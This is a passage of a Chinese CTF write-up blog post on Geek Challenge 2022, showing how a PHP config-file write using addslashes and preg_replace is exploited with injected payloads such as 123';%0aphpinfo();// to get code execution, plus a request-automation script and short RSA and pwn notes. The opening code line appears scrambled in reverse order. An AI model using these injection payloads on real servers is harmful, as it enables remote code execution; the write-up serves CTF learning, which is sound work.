+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffile_put_contents(&#x27;./config.php&#x27;, $file); $file = preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;, &quot;\$option=&#x27;$str&#x27;;&quot;, $file); $file = file_get_contents(&#x27;./config.php&#x27;);     &#125;       echo &#x27;:Where is the source code of config.php?&#x27;; if($str != NULL)&#123;  $str = addslashes($_GET[&#x27;option&#x27;]); if(!isset($_GET[&#x27;option&#x27;])) die(); &lt;?php </span><br></pre></td></tr></table></figure>
+
+<p>简单的拼接一下</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191411322.png?x-oss-process=wsy" alt="image-20221119141100231"></p>
+<p>在网上简单的搜索了一下，发现这是一个经典的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$str=addslashes($_GET[&#x27;option&#x27;]);</span><br><span class="line">$file=file_get_contents(&#x27;option.php&#x27;);</span><br><span class="line">$file=preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;, &quot;\$option=&#x27;$str&#x27;;&quot;, $file);</span><br><span class="line">echo $file;</span><br><span class="line">file_put_contents(&#x27;option.php&#x27;, $file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>先分析一下代码：</strong></p>
+<ol>
+<li><p>对传入的 option 参数进行 addslashes ，比如有单引号 <code>&#39;</code>，会变成<code>\&#39;</code><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191413603.png?x-oss-process=wsy" alt="image-20221119141356563"></p>
+<p>for example:</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191414146.png?x-oss-process=wsy" alt="image-20221119141443108"></p>
+</li>
+<li><p>通过正则匹配config.php 中的 <code>$option=&#39;123&#39;;</code>，将123的内容替换为经第一步处理的值。</p>
+</li>
+<li><p>替换完成，将其写入config.php</p>
+<p><strong>方法一（利用正则的.*、单引号)：</strong></p>
+</li>
+</ol>
+<p>先本地搭建一个环境，访问     <code>127.0.0.1/index.php?option=123&#39;;%0aphpinfo();//</code></p>
+<p>先创建一个config.php，内容如下：</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191421277.png?x-oss-process=wsy" alt="image-20221119142154242"></p>
+<p>经过 addslashes 后，$str 值为 <code>123\&#39;;%0aphpinfo();//</code></p>
+<p>进行正则匹配并写入文件，config.php的内容变为：</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191421045.png?x-oss-process=wsy" alt="image-20221119142107008"></p>
+<p>再访问：      <code>http://127.0.0.1/index.php?option=123</code></p>
+<p>正则匹配时，会将两个单引号里面的内容即123\，替换为123</p>
+<p>此时，config.php的内容变为</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191426085.png?x-oss-process=wsy" alt="image-20221119142635043"></p>
+<p>最后再访问:     <code>http://127.0.0.1/config.php</code></p>
+<p>成功shell</p>
+<p><strong>方法二(利用preg_replace的转义)：</strong></p>
+<p>访问 ：    <code>http://127.0.0.1/index.php?option=123\&#39;;phpinfo();//</code> </p>
+<p>经过 addslashes 后，$str 为 123<code>\\\&#39;;phpinfo();//</code></p>
+<p>(虽然 addslashes 将<code>\</code>转义为<code>\\</code>但是经过preg_replace正则匹配处理后<code>\\</code>又变为了\ ,三个\变成了两个\)</p>
+<p>所以config.php变为：</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191433502.png?x-oss-process=wsy" alt="image-20221119143310461"></p>
+<p>然后再访问：   <code>http://127.0.0.1/config.php</code></p>
+<p>成功getshell</p>
+<p>最终使用的第二个方法得到了flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191443448.png?x-oss-process=wsy" alt="image-20221119144347328"></p>
+<p>flag      SYC{y0u_c@n_RCEME_n0w!}</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30888707/article/details/94925910?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-94925910-blog-101026548.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-94925910-blog-101026548.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">(82条消息) PHP正则配合写配置文件导致Getshell_weixin_30888707的博客-CSDN博客</a>                                                                                                                                                                                       </p>
+<h2 id="ezrequset"><a href="#ezrequset" class="headerlink" title="ezrequset"></a>ezrequset</h2><p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211212136422.png?x-oss-process=wsy" alt="image-20221121213615321"></p>
+<p>点开是一个抢课的页面，看了大佬的wp，发现是通过正则匹配需求，然后编写python脚本进行抢课，成功后查看cookie即得flag</p>
+<p>脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Cookie&quot;:&quot;PHPSESSID=6095ef9901135760a85578d4aeb1090c; path=/&quot;,</span><br><span class="line">&#125;</span><br><span class="line">url_index = &quot;http://xb527867-699c-11ed-bc30-8a7749ef5b49.challenge.sycsec.com/?action=index&quot;</span><br><span class="line">res = requests.post(url_index,data=&#123;&#x27;xh&#x27;:1234&#125;,headers=header)</span><br><span class="line">txt = res.text</span><br><span class="line"># print(txt)</span><br><span class="line">xlass = re.findall(r&quot;鱼:(.+?)&lt;!DOCTYPE&quot;,txt)[0]</span><br><span class="line">print(xlass)</span><br><span class="line">no = re.findall(r&quot;(.+?)号&quot;,xlass)[0]</span><br><span class="line">print(no)</span><br><span class="line">xlass1 = re.findall(r&quot;号(.*)&quot;,xlass)[0]</span><br><span class="line">print(xlass1)</span><br><span class="line">url_check = &quot;http://xb527867-699c-11ed-bc30-8a7749ef5b49.challenge.sycsec.com/?action=check&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;num&quot;:no,</span><br><span class="line">    &quot;class&quot;:xlass1,</span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url_check,data,headers=header)</span><br><span class="line">print(res1.text)</span><br><span class="line">cookie = requests.utils.dict_from_cookiejar(res1.cookies)</span><br><span class="line">print(cookie)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211212138662.png?x-oss-process=wsy" alt="image-20221121213821596"></p>
+<p>flag    SYC{just_@_ez_requ3st}</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="StarterRSA"><a href="#StarterRSA" class="headerlink" title="StarterRSA"></a>StarterRSA</h2><p>简单的rsa，首先在yafu里面分解一下n，得到p和q</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171928636.png?x-oss-process=wsy" alt="image-20221117192835491"></p>
+<p>然后使用简单的脚本跑一下</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171930060.png?x-oss-process=wsy"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171930253.png?x-oss-process=wsy" alt="image-20221117193056217"></p>
+<p>最终得到flag    SYC{5t4rt_R5A_ls_1t_3a5y?}</p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>直接nc得到flag   SYC{n0w_d0~y0u-know_wh@7-1$_n&lt;_w#47-15-pwn}</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181840827.png?x-oss-process=wsy" alt="image-20221118184011747"></p>
+<h2 id="pwn1-1"><a href="#pwn1-1" class="headerlink" title="pwn1_1"></a>pwn1_1</h2><p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211190941458.png?x-oss-process=wsy" alt="image-20221119094105328"></p>
+<p>找到backdoor    发现远程地址是401196</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181911797.png?x-oss-process=wsy" alt="image-20221118191114741"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181910084.png?x-oss-process=wsy" alt="image-20221118191027001"></p>
+<p>所以偏移量是16+8=24</p>
+<p>直接上脚本</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211190942289.png?x-oss-process=wsy" alt="image-20221119094236259"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211190942973.png?x-oss-process=wsy" alt="image-20221119094256860"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>余归
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/01/Geek%20Challenge%202022/" title="Geek Challenge 2022题目复现">http://example.com/2022/12/01/Geek Challenge 2022/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/31/bugku/" rel="prev" title="bugku之web">
+      <i class="fa fa-chevron-left"></i> bugku之web
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#L0veSyc"><span class="nav-number">1.1.</span> <span class="nav-text">L0veSyc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Can-Can-Need"><span class="nav-number">1.2.</span> <span class="nav-text">Can Can Need</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E9%99%86%E8%AF%95%E8%AF%95"><span class="nav-number">1.3.</span> <span class="nav-text">登陆试试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E5%8F%91%E5%8C%85%E5%90%97"><span class="nav-number">1.4.</span> <span class="nav-text">你能发包吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#justphp"><span class="nav-number">1.5.</span> <span class="nav-text">justphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#justfind"><span class="nav-number">1.6.</span> <span class="nav-text">justfind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezR-F-I"><span class="nav-number">1.7.</span> <span class="nav-text">ezR_F_I</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WelcomeSQL"><span class="nav-number">1.8.</span> <span class="nav-text">WelcomeSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyupload"><span class="nav-number">1.9.</span> <span class="nav-text">babyupload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezrce"><span class="nav-number">1.10.</span> <span class="nav-text">ezrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uploadrce"><span class="nav-number">1.11.</span> <span class="nav-text">uploadrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezrequset"><span class="nav-number">1.12.</span> <span class="nav-text">ezrequset</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#StarterRSA"><span class="nav-number">2.1.</span> <span class="nav-text">StarterRSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">3.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nc"><span class="nav-number">3.1.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-1"><span class="nav-number">3.2.</span> <span class="nav-text">pwn1_1</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="余归"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">余归</p>
+  <div class="site-description" itemprop="description">Believe not all that you see nor half what you hear.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+
+
+
+      
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp-CTF/" rel="tag">-wp -CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">32</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tips/" rel="tag">tips</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">23</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a><span class="tag-list-count">1</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022025057号-1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000196%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000196号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; Sun Dec 26 2021 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">余归</span>
+</div>
+  <div class="powered-by">
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("12/25/2021 17:38:00");
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "影影已在此快乐的玩耍了 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+<br />
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">影影的家共种了47.3k朵花</span>
+</div>
+
+<br />
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    已经有<span id="busuanzi_value_site_pv"></span>人摘了影影种的花</span>
+    <span class="post-meta-divider"> </span>
+    其中<span id="busuanzi_value_site_uv"></span>人不留痕迹地跑了</span>
+    <span class="post-meta-divider"> </span>
+
+
+
+
+
+<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'vcFyBSklL05djh0SlQ0i9Idk-gzGzoHsz',
+      appKey     : 'wFXz2jiwl2Jo3Q5LWDFdhUsv',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
+
+
+<script src="/js/cursor.js"></script>
+
+<script type="text/javascript">
+//只在桌面版网页启用特效
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
